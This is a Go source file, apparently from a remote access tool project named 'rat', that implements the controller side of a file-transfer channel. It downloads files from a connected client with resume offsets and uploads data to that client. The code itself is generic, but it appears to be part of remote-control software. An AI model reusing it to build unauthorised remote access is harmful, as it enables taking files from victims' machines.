package main

import (
	"encoding/binary"
	"io"
	"os"
	"rat/shared"
	"rat/shared/network/header"
)

type ChannelTransfer struct {
	Transfer   *Transfer
	controller *Controller
}

func (ChannelTransfer) Header() header.PacketHeader {
	return header.ChannelTransferHeader
}

func (ch ChannelTransfer) Open(rwc io.ReadWriteCloser, c *Client) error {
	defer rwc.Close()

	binary.Write(rwc, binary.LittleEndian, ch.Transfer.Download)
	binary.Write(rwc, binary.LittleEndian, ch.Transfer.Offset)
	shared.WriteString(rwc, ch.Transfer.Remote)

	if ch.Transfer.Download {
		fp, err := os.OpenFile(ch.Transfer.Local, os.O_RDWR|os.O_CREATE, 0666)

		if ch.Transfer.Offset > 0 {
			_, err = fp.Seek(ch.Transfer.Offset, io.SeekStart)
			if err != nil {
				panic(err)
			}
		}

		ch.Transfer.writer = fp
		io.Copy(ch.Transfer, rwc)
	} else {
		r, w := io.Pipe()
		ch.Transfer.reader = r

		listener := ch.controller.Listen(UploadToClient, c)
		defer listener.Unlisten()
		go func() {
			defer ch.Transfer.Close()
			for {
				select {
				case <-c.die:
					return
				case <-ch.controller.die:
					return
				case msgi := <-listener.C:
					if msgi != nil {
						msg := msgi.(*UploadMessage)
						w.Write(msg.Data)
						if ch.Transfer.Offset >= ch.Transfer.Len {
							return
						}
					} else {
						return
					}
				}
			}
		}()

		io.Copy(rwc, ch.Transfer)
	}

	ch.Transfer.Close()

	return nil
}
